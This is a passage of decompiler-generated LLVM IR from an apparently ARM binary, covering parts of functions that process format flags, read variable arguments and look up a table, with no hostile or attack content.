  %v2_e514 = add i32 %v1_e514, 24
  %v3_e514 = inttoptr i32 %v2_e514 to i32*
  store i32 %v0_e514, i32* %v3_e514, align 4
  %v0_e518 = load i32, i32* %r3.global-to-local, align 4
  %v1_e518 = load i32, i32* @r0, align 4
  %v2_e518 = add i32 %v1_e518, 4
  %v3_e518 = inttoptr i32 %v2_e518 to i32*
  store i32 %v0_e518, i32* %v3_e518, align 4
  %v0_e51c = call i32 @function_e530()
  store i32 %v0_e51c, i32* @r0, align 4
  %v0_e520 = load i32, i32* %r5.global-to-local, align 4
  %v1_e520 = load i32, i32* @r4, align 4
  %v2_e520 = add i32 %v1_e520, 24
  %v3_e520 = inttoptr i32 %v2_e520 to i32*
  store i32 %v0_e520, i32* %v3_e520, align 4
  br label %dec_label_pc_e524

dec_label_pc_e524:                                ; preds = %dec_label_pc_e4ec, %dec_label_pc_e508
  %v2_e528 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e528, i32* @r4, align 4
  %v1_e52c = load i32, i32* @r0, align 4
  ret i32 %v1_e52c

; uselistorder directives
  uselistorder i32 %v0_e4f0, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_e530, { 1, 0 }
  uselistorder label %dec_label_pc_e524, { 1, 0 }
}

define i32 @function_e530() local_unnamed_addr {
dec_label_pc_e530:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_e530 = load i32, i32* @r0, align 4
  %v1_e530 = add i32 %v0_e530, 24
  %v2_e530 = inttoptr i32 %v1_e530 to i32*
  %v3_e530 = load i32, i32* %v2_e530, align 4
  store i32 %v3_e530, i32* %r1.global-to-local, align 4
  %v2_e534 = icmp eq i32 %v3_e530, 0
  %v3_e538 = load i32, i32* @r4, align 4
  store i32 %v3_e538, i32* %stack_var_-8, align 4
  %v1_e53c = add i32 %v0_e530, 8
  %v2_e53c = inttoptr i32 %v1_e53c to i32*
  %v3_e53c = load i32, i32* %v2_e53c, align 4
  store i32 %v3_e53c, i32* %r3.global-to-local, align 4
  %v6_e544 = icmp eq i32 %v3_e53c, -2147483648
  br i1 %v2_e534, label %dec_label_pc_e544, label %dec_label_pc_e67c

dec_label_pc_e544:                                ; preds = %dec_label_pc_e530
  br i1 %v6_e544, label %dec_label_pc_e54c, label %dec_label_pc_e564

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e544
  %v1_e54c = add i32 %v0_e530, 76
  %v2_e54c = inttoptr i32 %v1_e54c to i32*
  %v3_e54c = load i32, i32* %v2_e54c, align 4
  store i32 %v3_e54c, i32* %r3.global-to-local, align 4
  %v1_e550 = inttoptr i32 %v3_e54c to i32*
  %v2_e550 = load i32, i32* %v1_e550, align 4
  store i32 %v2_e550, i32* %r2.global-to-local, align 4
  %v1_e554 = add i32 %v3_e54c, 4
  store i32 %v1_e554, i32* %r3.global-to-local, align 4
  store i32 %v1_e554, i32* %v2_e54c, align 4
  %v0_e55c = load i32, i32* %r2.global-to-local, align 4
  %v1_e55c = load i32, i32* @r0, align 4
  %v2_e55c = add i32 %v1_e55c, 8
  %v3_e55c = inttoptr i32 %v2_e55c to i32*
  store i32 %v0_e55c, i32* %v3_e55c, align 4
  %v0_e560 = load i32, i32* %r2.global-to-local, align 4
  %v1_e560 = load i32, i32* @r0, align 4
  %v2_e560 = add i32 %v1_e560, 80
  %v3_e560 = inttoptr i32 %v2_e560 to i32*
  store i32 %v0_e560, i32* %v3_e560, align 4
  %v0_e564.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e564

dec_label_pc_e564:                                ; preds = %dec_label_pc_e544, %dec_label_pc_e54c
  %v1_e580 = phi i32 [ %v0_e530, %dec_label_pc_e544 ], [ %v0_e564.pre, %dec_label_pc_e54c ]
  %v1_e564 = add i32 %v1_e580, 4
  %v2_e564 = inttoptr i32 %v1_e564 to i32*
  %v3_e564 = load i32, i32* %v2_e564, align 4
  store i32 %v3_e564, i32* %r3.global-to-local, align 4
  %v6_e568 = icmp eq i32 %v3_e564, -2147483648
  %v1_e56c = add i32 %v1_e580, 80
  store i32 %v1_e56c, i32* %ip.global-to-local, align 4
  br i1 %v6_e568, label %dec_label_pc_e574, label %dec_label_pc_e58c

dec_label_pc_e574:                                ; preds = %dec_label_pc_e564
  %v1_e574 = add i32 %v1_e580, 76
  %v2_e574 = inttoptr i32 %v1_e574 to i32*
  %v3_e574 = load i32, i32* %v2_e574, align 4
  store i32 %v3_e574, i32* %r3.global-to-local, align 4
  %v1_e578 = inttoptr i32 %v3_e574 to i32*
  %v2_e578 = load i32, i32* %v1_e578, align 4
  store i32 %v2_e578, i32* %r2.global-to-local, align 4
  %v1_e57c = add i32 %v3_e574, 4
  store i32 %v1_e57c, i32* %r3.global-to-local, align 4
  store i32 %v1_e57c, i32* %v2_e574, align 4
  %v0_e584 = load i32, i32* %r2.global-to-local, align 4
  %v1_e584 = load i32, i32* @r0, align 4
  %v2_e584 = add i32 %v1_e584, 4
  %v3_e584 = inttoptr i32 %v2_e584 to i32*
  store i32 %v0_e584, i32* %v3_e584, align 4
  %v0_e588 = load i32, i32* %r2.global-to-local, align 4
  %v1_e588 = load i32, i32* @r0, align 4
  %v2_e588 = add i32 %v1_e588, 80
  %v3_e588 = inttoptr i32 %v2_e588 to i32*
  store i32 %v0_e588, i32* %v3_e588, align 4
  %v0_e66c17.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e58c

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e564, %dec_label_pc_e574
  %v0_e66c17 = phi i32 [ %v1_e580, %dec_label_pc_e564 ], [ %v0_e66c17.pre, %dec_label_pc_e574 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_e590 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e590, i32* %lr.global-to-local, align 4
  %v1_e66c18 = add i32 %v0_e66c17, 28
  %v2_e66c19 = inttoptr i32 %v1_e66c18 to i32*
  %v3_e66c20 = load i32, i32* %v2_e66c19, align 4
  store i32 %v3_e66c20, i32* %r3.global-to-local, align 4
  %v5_e67422 = icmp slt i32 %v0_e590, %v3_e66c20
  br i1 %v5_e67422, label %dec_label_pc_e598, label %dec_label_pc_e678.loopexit

dec_label_pc_e598:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e66c.backedge
  %v0_e66c24 = phi i32 [ %v0_e66c, %dec_label_pc_e66c.backedge ], [ %v0_e66c17, %dec_label_pc_e58c ]
  %v0_e5a423 = phi i32 [ %v0_e5a4.be, %dec_label_pc_e66c.backedge ], [ %v0_e590, %dec_label_pc_e58c ]
  %v4_e598 = mul i32 %v0_e5a423, 4
  %v5_e598 = add i32 %v4_e598, %v0_e66c24
  store i32 %v5_e598, i32* %r3.global-to-local, align 4
  %v1_e59c = add i32 %v5_e598, 40
  %v2_e59c = inttoptr i32 %v1_e59c to i32*
  %v3_e59c = load i32, i32* %v2_e59c, align 4
  store i32 %v3_e59c, i32* %r3.global-to-local, align 4
  %v7_e5a0 = icmp eq i32 %v3_e59c, 8
  %v1_e5a4 = add i32 %v0_e5a423, 1
  store i32 %v1_e5a4, i32* %lr.global-to-local, align 4
  br i1 %v7_e5a0, label %dec_label_pc_e66c.backedge, label %dec_label_pc_e5ac

dec_label_pc_e5ac:                                ; preds = %dec_label_pc_e598
  %v1_e5ac = add i32 %v0_e66c24, 76
  %v2_e5ac = inttoptr i32 %v1_e5ac to i32*
  %v3_e5ac = load i32, i32* %v2_e5ac, align 4
  store i32 %v3_e5ac, i32* %r1.global-to-local, align 4
  %v8_e5b0 = icmp sgt i32 %v3_e59c, 8
  br i1 %v8_e5b0, label %dec_label_pc_e5d4, label %dec_label_pc_e5b4

dec_label_pc_e5b4:                                ; preds = %dec_label_pc_e5ac
  %v7_e5b4 = icmp eq i32 %v3_e59c, 2
  br i1 %v7_e5b4, label %dec_label_pc_e624, label %dec_label_pc_e5bc

dec_label_pc_e5bc:                                ; preds = %dec_label_pc_e5b4
  %v8_e5bc = icmp sgt i32 %v3_e59c, 2
  br i1 %v8_e5bc, label %dec_label_pc_e5cc, label %dec_label_pc_e5c0

dec_label_pc_e5c0:                                ; preds = %dec_label_pc_e5bc
  %v1_e5c0 = icmp slt i32 %v3_e59c, 0
  br i1 %v1_e5c0, label %dec_label_pc_e658, label %dec_label_pc_e624

dec_label_pc_e5cc:                                ; preds = %dec_label_pc_e5bc
  %v7_e5cc = icmp eq i32 %v3_e59c, 7
  br i1 %v7_e5cc, label %dec_label_pc_e638, label %dec_label_pc_e658

dec_label_pc_e5d4:                                ; preds = %dec_label_pc_e5ac
  %v7_e5d4 = icmp eq i32 %v3_e59c, 1024
  br i1 %v7_e5d4, label %dec_label_pc_e624, label %dec_label_pc_e5dc

dec_label_pc_e5dc:                                ; preds = %dec_label_pc_e5d4
  %v8_e5dc = icmp sgt i32 %v3_e59c, 1024
  br i1 %v8_e5dc, label %dec_label_pc_e5f4, label %dec_label_pc_e5e0

dec_label_pc_e5e0:                                ; preds = %dec_label_pc_e5dc
  switch i32 %v3_e59c, label %dec_label_pc_e658 [
    i32 256, label %dec_label_pc_e624
    i32 512, label %dec_label_pc_e624
  ]

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e5dc
  %v7_e5f4 = icmp eq i32 %v3_e59c, 2048
  br i1 %v7_e5f4, label %dec_label_pc_e608, label %dec_label_pc_e600

dec_label_pc_e600:                                ; preds = %dec_label_pc_e5f4
  %v1_e5fc = load i32, i32* %r4.global-to-local, align 4
  %v9_e5fc = icmp eq i32 %v3_e59c, %v1_e5fc
  br i1 %v9_e5fc, label %dec_label_pc_e638, label %dec_label_pc_e658

dec_label_pc_e608:                                ; preds = %dec_label_pc_e5f4
  %v1_e608 = add i32 %v3_e5ac, 7
  %v1_e60c = and i32 %v1_e608, -8
  store i32 %v1_e60c, i32* %r3.global-to-local, align 4
  %v1_e610 = inttoptr i32 %v1_e60c to i32*
  %v2_e610 = load i32, i32* %v1_e610, align 8
  store i32 %v2_e610, i32* %r1.global-to-local, align 4
  %v3_e610 = or i32 %v1_e60c, 4
  %v4_e610 = inttoptr i32 %v3_e610 to i32*
  %v5_e610 = load i32, i32* %v4_e610, align 4
  store i32 %v5_e610, i32* %r2.global-to-local, align 4
  %v1_e614 = add i32 %v1_e60c, 8
  store i32 %v1_e614, i32* %r3.global-to-local, align 4
  store i32 %v1_e614, i32* %v2_e5ac, align 4
  %v0_e61c = load i32, i32* %ip.global-to-local, align 4
  %v1_e61c = inttoptr i32 %v0_e61c to i32*
  %v2_e61c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_e61c, i32* %v1_e61c, align 4
  %v3_e61c = add i32 %v0_e61c, 4
  %v4_e61c = inttoptr i32 %v3_e61c to i32*
  %v5_e61c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_e61c, i32* %v4_e61c, align 4
  br label %dec_label_pc_e668

dec_label_pc_e624:                                ; preds = %dec_label_pc_e5e0, %dec_label_pc_e5e0, %dec_label_pc_e5c0, %dec_label_pc_e5d4, %dec_label_pc_e5b4
  %v1_e624 = inttoptr i32 %v3_e5ac to i32*
  %v2_e624 = load i32, i32* %v1_e624, align 4
  store i32 %v2_e624, i32* %r2.global-to-local, align 4
  %v1_e628 = add i32 %v3_e5ac, 4
  store i32 %v1_e628, i32* %r3.global-to-local, align 4
  store i32 %v1_e628, i32* %v2_e5ac, align 4
  %v0_e630 = load i32, i32* %r2.global-to-local, align 4
  %v1_e630 = load i32, i32* %ip.global-to-local, align 4
  %v2_e630 = inttoptr i32 %v1_e630 to i32*
  store i32 %v0_e630, i32* %v2_e630, align 4
  br label %dec_label_pc_e668

dec_label_pc_e638:                                ; preds = %dec_label_pc_e5cc, %dec_label_pc_e600
  %v3_e638 = load i32, i32* %v2_e5ac, align 4
  %v1_e63c = add i32 %v3_e638, 7
  %v1_e640 = and i32 %v1_e63c, -8
  store i32 %v1_e640, i32* %r3.global-to-local, align 4
  %v1_e644 = inttoptr i32 %v1_e640 to i32*
  %v2_e644 = load i32, i32* %v1_e644, align 8
  store i32 %v2_e644, i32* %r1.global-to-local, align 4
  %v3_e644 = or i32 %v1_e640, 4
  %v4_e644 = inttoptr i32 %v3_e644 to i32*
  %v5_e644 = load i32, i32* %v4_e644, align 4
  store i32 %v5_e644, i32* %r2.global-to-local, align 4
  %v1_e648 = add i32 %v1_e640, 8
  store i32 %v1_e648, i32* %r3.global-to-local, align 4
  store i32 %v1_e648, i32* %v2_e5ac, align 4
  %v0_e650 = load i32, i32* %ip.global-to-local, align 4
  %v1_e650 = inttoptr i32 %v0_e650 to i32*
  %v2_e650 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_e650, i32* %v1_e650, align 4
  %v3_e650 = add i32 %v0_e650, 4
  %v4_e650 = inttoptr i32 %v3_e650 to i32*
  %v5_e650 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_e650, i32* %v4_e650, align 4
  br label %dec_label_pc_e668

dec_label_pc_e658:                                ; preds = %dec_label_pc_e5e0, %dec_label_pc_e5cc, %dec_label_pc_e5c0, %dec_label_pc_e600
  %v1_e658 = add i32 %v3_e5ac, 4
  store i32 %v1_e658, i32* %r3.global-to-local, align 4
  store i32 %v1_e658, i32* %v2_e5ac, align 4
  %v0_e660 = load i32, i32* %r1.global-to-local, align 4
  %v1_e660 = inttoptr i32 %v0_e660 to i32*
  %v2_e660 = load i32, i32* %v1_e660, align 4
  store i32 %v2_e660, i32* %r3.global-to-local, align 4
  %v1_e664 = load i32, i32* %ip.global-to-local, align 4
  %v2_e664 = inttoptr i32 %v1_e664 to i32*
  store i32 %v2_e660, i32* %v2_e664, align 4
  br label %dec_label_pc_e668

dec_label_pc_e668:                                ; preds = %dec_label_pc_e638, %dec_label_pc_e624, %dec_label_pc_e608, %dec_label_pc_e658
  %v0_e668 = load i32, i32* %ip.global-to-local, align 4
  %v1_e668 = add i32 %v0_e668, 8
  store i32 %v1_e668, i32* %ip.global-to-local, align 4
  %v0_e670.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_e66c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e66c.backedge

dec_label_pc_e66c.backedge:                       ; preds = %dec_label_pc_e668, %dec_label_pc_e598
  %v0_e66c = phi i32 [ %v0_e66c.pre, %dec_label_pc_e668 ], [ %v0_e66c24, %dec_label_pc_e598 ]
  %v0_e5a4.be = phi i32 [ %v0_e670.pre.pre, %dec_label_pc_e668 ], [ %v1_e5a4, %dec_label_pc_e598 ]
  %v1_e66c = add i32 %v0_e66c, 28
  %v2_e66c = inttoptr i32 %v1_e66c to i32*
  %v3_e66c = load i32, i32* %v2_e66c, align 4
  store i32 %v3_e66c, i32* %r3.global-to-local, align 4
  %v5_e674 = icmp slt i32 %v0_e5a4.be, %v3_e66c
  br i1 %v5_e674, label %dec_label_pc_e598, label %dec_label_pc_e66c.dec_label_pc_e678.loopexit_crit_edge

dec_label_pc_e67c:                                ; preds = %dec_label_pc_e530
  br i1 %v6_e544, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e67c
  %v2_e680 = add i32 %v0_e530, 36
  %v3_e680 = inttoptr i32 %v2_e680 to i8*
  %v4_e680 = load i8, i8* %v3_e680, align 1
  %v5_e680 = zext i8 %v4_e680 to i32
  %v5_e684 = mul nuw nsw i32 %v5_e680, 8
  %v6_e684 = add i32 %v5_e684, %v0_e530
  store i32 %v6_e684, i32* %r3.global-to-local, align 4
  %v2_e688 = add i32 %v6_e684, 72
  %v3_e688 = inttoptr i32 %v2_e688 to i32*
  %v4_e688 = load i32, i32* %v3_e688, align 4
  store i32 %v4_e688, i32* %r3.global-to-local, align 4
  store i32 %v4_e688, i32* %v2_e53c, align 4
  %v0_e690.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e67c, %bb
  %v2_e6a4 = phi i32 [ %v0_e690.pre, %bb ], [ %v0_e530, %dec_label_pc_e67c ]
  %v1_e690 = add i32 %v2_e6a4, 4
  %v2_e690 = inttoptr i32 %v1_e690 to i32*
  %v3_e690 = load i32, i32* %v2_e690, align 4
  store i32 %v3_e690, i32* %r3.global-to-local, align 4
  %v6_e694 = icmp eq i32 %v3_e690, -2147483648
  br i1 %v6_e694, label %bb16, label %dec_label_pc_e678

bb16:                                             ; preds = %.thread1
  %v2_e698 = add i32 %v2_e6a4, 37
  %v3_e698 = inttoptr i32 %v2_e698 to i8*
  %v4_e698 = load i8, i8* %v3_e698, align 1
  %v5_e698 = zext i8 %v4_e698 to i32
  %v5_e69c = mul nuw nsw i32 %v5_e698, 8
  %v6_e69c = add i32 %v5_e69c, %v2_e6a4
  store i32 %v6_e69c, i32* %r3.global-to-local, align 4
  %v2_e6a0 = add i32 %v6_e69c, 72
  %v3_e6a0 = inttoptr i32 %v2_e6a0 to i32*
  %v4_e6a0 = load i32, i32* %v3_e6a0, align 4
  store i32 %v4_e6a0, i32* %r3.global-to-local, align 4
  store i32 %v4_e6a0, i32* %v2_e690, align 4
  %v0_e6a8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e678

dec_label_pc_e66c.dec_label_pc_e678.loopexit_crit_edge: ; preds = %dec_label_pc_e66c.backedge
  br label %dec_label_pc_e678.loopexit

dec_label_pc_e678.loopexit:                       ; preds = %dec_label_pc_e66c.dec_label_pc_e678.loopexit_crit_edge, %dec_label_pc_e58c
  %v0_e66c.lcssa = phi i32 [ %v0_e66c, %dec_label_pc_e66c.dec_label_pc_e678.loopexit_crit_edge ], [ %v0_e66c17, %dec_label_pc_e58c ]
  br label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %dec_label_pc_e678.loopexit, %.thread1, %bb16
  %v1_e6c8 = phi i32 [ %v0_e66c.lcssa, %dec_label_pc_e678.loopexit ], [ %v2_e6a4, %.thread1 ], [ %v0_e6a8.pre, %bb16 ]
  %v1_e6a8 = add i32 %v1_e6c8, 8
  %v2_e6a8 = inttoptr i32 %v1_e6a8 to i32*
  %v3_e6a8 = load i32, i32* %v2_e6a8, align 4
  store i32 %v3_e6a8, i32* %r1.global-to-local, align 4
  %v1_e6ac = icmp slt i32 %v3_e6a8, 0
  br i1 %v1_e6ac, label %dec_label_pc_e6b4, label %dec_label_pc_e6d4

dec_label_pc_e6b4:                                ; preds = %dec_label_pc_e678
  %v1_e6b4 = add i32 %v1_e6c8, 16
  %v2_e6b4 = inttoptr i32 %v1_e6b4 to i32*
  %v3_e6b4 = load i32, i32* %v2_e6b4, align 4
  %v1_e6bc = sub i32 0, %v3_e6a8
  store i32 %v1_e6bc, i32* %r1.global-to-local, align 4
  %v1_e6b8 = and i32 %v3_e6b4, -10
  %v1_e6c0 = or i32 %v1_e6b8, 8
  store i32 %v1_e6c0, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_e6c8 = add i32 %v1_e6c8, 20
  %v3_e6c8 = inttoptr i32 %v2_e6c8 to i32*
  store i32 32, i32* %v3_e6c8, align 4
  %v0_e6cc = load i32, i32* %r1.global-to-local, align 4
  %v1_e6cc = load i32, i32* @r0, align 4
  %v2_e6cc = add i32 %v1_e6cc, 8
  %v3_e6cc = inttoptr i32 %v2_e6cc to i32*
  store i32 %v0_e6cc, i32* %v3_e6cc, align 4
  %v0_e6d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e6d0 = load i32, i32* @r0, align 4
  %v2_e6d0 = add i32 %v1_e6d0, 16
  %v3_e6d0 = inttoptr i32 %v2_e6d0 to i32*
  store i32 %v0_e6d0, i32* %v3_e6d0, align 4
  %v1_e6d8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e678, %dec_label_pc_e6b4
  %v1_e6d8 = phi i32 [ %v1_e6c8, %dec_label_pc_e678 ], [ %v1_e6d8.pre, %dec_label_pc_e6b4 ]
  %v2_e6d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e6d4, i32* @r4, align 4
  ret i32 %v1_e6d8

; uselistorder directives
  uselistorder i32 %v2_e6a4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_e5a4.be, { 1, 0 }
  uselistorder i32 %v0_e66c, { 1, 2, 0 }
  uselistorder i32 %v3_e5ac, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_e5ac, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_e59c, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_e5a423, { 1, 0 }
  uselistorder i32 %v0_e66c24, { 0, 2, 1 }
  uselistorder i32 %v0_e66c17, { 2, 0, 1 }
  uselistorder i32 %v0_e530, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 80, { 4, 5, 6, 0, 7, 1, 3, 2 }
  uselistorder label %dec_label_pc_e6d4, { 1, 0 }
  uselistorder label %dec_label_pc_e678, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e668, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e658, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e638, { 1, 0 }
  uselistorder label %dec_label_pc_e624, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_e598, { 1, 0 }
  uselistorder label %dec_label_pc_e58c, { 1, 0 }
  uselistorder label %dec_label_pc_e564, { 1, 0 }
}

define i32 @function_e6e0() local_unnamed_addr {
dec_label_pc_e6e0:
  %v1_e6fc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e6f8

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e704, %dec_label_pc_e6e0
  %v0_e6f8 = phi i32 [ %v1_e6f8, %dec_label_pc_e704 ], [ ptrtoint (i32* @global_var_19b2a.332 to i32), %dec_label_pc_e6e0 ]
  %v1_e6f8 = add i32 %v0_e6f8, -2
  %v2_e6f8 = inttoptr i32 %v1_e6f8 to i16*
  %v3_e6f8 = load i16, i16* %v2_e6f8, align 2
  %v4_e6f8 = sext i16 %v3_e6f8 to i32
  store i32 %v1_e6f8, i32* @ip, align 4
  %v9_e6fc = icmp eq i32 %v4_e6f8, %v1_e6fc.pre
  br i1 %v9_e6fc, label %dec_label_pc_e6f8.dec_label_pc_e70c_crit_edge, label %dec_label_pc_e704

dec_label_pc_e6f8.dec_label_pc_e70c_crit_edge:    ; preds = %dec_label_pc_e6f8
  br label %dec_label_pc_e70c

dec_label_pc_e704:                                ; preds = %dec_label_pc_e6f8
  %tmp = icmp ugt i32 %v1_e6f8, ptrtoint (i32* @global_var_19b12.331 to i32)
  br i1 %tmp, label %dec_label_pc_e6f8, label %dec_label_pc_e70c.loopexit

dec_label_pc_e70c.loopexit:                       ; preds = %dec_label_pc_e704
  br label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %dec_label_pc_e70c.loopexit, %dec_label_pc_e6f8.dec_label_pc_e70c_crit_edge
  %v2_e71c.pre-phi = sub i32 %v1_e6f8, ptrtoint (i32* @global_var_19b12.331 to i32)
  store i32 %v2_e71c.pre-phi, i32* @r2, align 4
  %v4_e720 = sdiv i32 %v2_e71c.pre-phi, 2
  %v5_e720 = add i32 %v4_e720, ptrtoint (i32* @global_var_19b2a.332 to i32)
  %v6_e720 = inttoptr i32 %v5_e720 to i8*
  %v7_e720 = load i8, i8* %v6_e720, align 1
  %v9_e720 = zext i8 %v7_e720 to i32
  ret i32 %v9_e720

; uselistorder directives
  uselistorder i32 %v2_e71c.pre-phi, { 1, 0 }
  uselistorder i32 %v1_e6f8, { 0, 1, 3, 4, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_19b2a.332 to i32), { 1, 0 }
}

define i32 @function_e734(i8* %arg1) local_unnamed_addr {
dec_label_pc_e734:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp115 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e734 = load i32, i32* @r4, align 4
  store i32 %v3_e734, i32* %stack_var_-36, align 4
  %v6_e734 = load i32, i32* @r5, align 4
  %v27_e734 = load i32, i32* @lr, align 4
  %v0_e738 = load i32, i32* %r0.global-to-local, align 4
  %v1_e738 = add i32 %v0_e738, 16
  %v2_e738 = inttoptr i32 %v1_e738 to i32*
  %v3_e738 = load i32, i32* %v2_e738, align 4
  %v1_e740 = and i32 %v3_e738, 128
  store i32 %v1_e740, i32* @r4, align 4
  %v2_e740 = icmp eq i32 %v1_e740, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_e738, i32* %r7.global-to-local, align 4
  store i32 142964, i32* @lr, align 4
  %v1_e768 = add i32 %v0_e738, 24
  %v2_e768 = inttoptr i32 %v1_e768 to i32*
  %v3_e768 = load i32, i32* %v2_e768, align 4
  store i32 %v3_e768, i32* %fp.global-to-local, align 4
  br i1 %v2_e740, label %.dec_label_pc_e7bc_crit_edge, label %dec_label_pc_e774

.dec_label_pc_e7bc_crit_edge:                     ; preds = %dec_label_pc_e734
  %v2_e76c = inttoptr i32 %v0_e738 to i32*
  %v3_e76c = load i32, i32* %v2_e76c, align 4
  store i32 %v3_e76c, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e7bc

dec_label_pc_e774:                                ; preds = %dec_label_pc_e734
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_e784 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %dec_label_pc_e7a8.dec_label_pc_e778_crit_edge, %dec_label_pc_e774
  %v1_e788 = phi i32 [ %v1_e798, %dec_label_pc_e7a8.dec_label_pc_e778_crit_edge ], [ 0, %dec_label_pc_e774 ]
  %v0_e778 = phi i32 [ %v0_e778.pre, %dec_label_pc_e7a8.dec_label_pc_e778_crit_edge ], [ %v0_e738, %dec_label_pc_e774 ]
  %v1_e778 = inttoptr i32 %v0_e778 to i32*
  %v2_e778 = load i32, i32* %v1_e778, align 4
  %v4_e77c = mul i32 %v1_e788, 4
  %v5_e77c = add i32 %v2_e778, %v4_e77c
  store i32 %v5_e77c, i32* %r3.global-to-local, align 4
  %v1_e780 = add i32 %v5_e77c, -4
  %v2_e780 = inttoptr i32 %v1_e780 to i8*
  %v3_e780 = load i8, i8* %v2_e780, align 1
  %v4_e780 = zext i8 %v3_e780 to i32
  store i32 %v4_e780, i32* %r1.global-to-local, align 4
  store i32 %v2_e784, i32* @ip, align 4
  %v2_e788 = add i32 %v1_e788, %v2_e784
  store i32 %v2_e788, i32* %r2.global-to-local, align 4
  %v3_e78c = add i32 %v2_e788, -72
  %v4_e78c = inttoptr i32 %v3_e78c to i8*
  store i8 %v3_e780, i8* %v4_e78c, align 1
  %v0_e790 = load i32, i32* %r3.global-to-local, align 4
  %v1_e790 = add i32 %v0_e790, -4
  %v2_e790 = inttoptr i32 %v1_e790 to i32*
  %v3_e790 = load i32, i32* %v2_e790, align 4
  store i32 %v3_e790, i32* %r3.global-to-local, align 4
  %v0_e794 = load i32, i32* %r1.global-to-local, align 4
  %v9_e794 = icmp eq i32 %v0_e794, %v3_e790
  %v0_e798 = load i32, i32* %r0.global-to-local, align 4
  %v1_e798 = add i32 %v0_e798, 1
  store i32 %v1_e798, i32* %r0.global-to-local, align 4
  br i1 %v9_e794, label %dec_label_pc_e7a0, label %dec_label_pc_ec64

dec_label_pc_e7a0:                                ; preds = %dec_label_pc_e778
  %v2_e7a0 = icmp eq i32 %v3_e790, 0
  br i1 %v2_e7a0, label %dec_label_pc_e7b0, label %dec_label_pc_e7a8

dec_label_pc_e7a8:                                ; preds = %dec_label_pc_e7a0
  %tmp180 = icmp ult i32 %v1_e798, 32
  br i1 %tmp180, label %dec_label_pc_e7a8.dec_label_pc_e778_crit_edge, label %dec_label_pc_e7b0

dec_label_pc_e7a8.dec_label_pc_e778_crit_edge:    ; preds = %dec_label_pc_e7a8
  %v0_e778.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e778

dec_label_pc_e7b0:                                ; preds = %dec_label_pc_e7a8, %dec_label_pc_e7a0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e7b8 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_e7b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e7bc

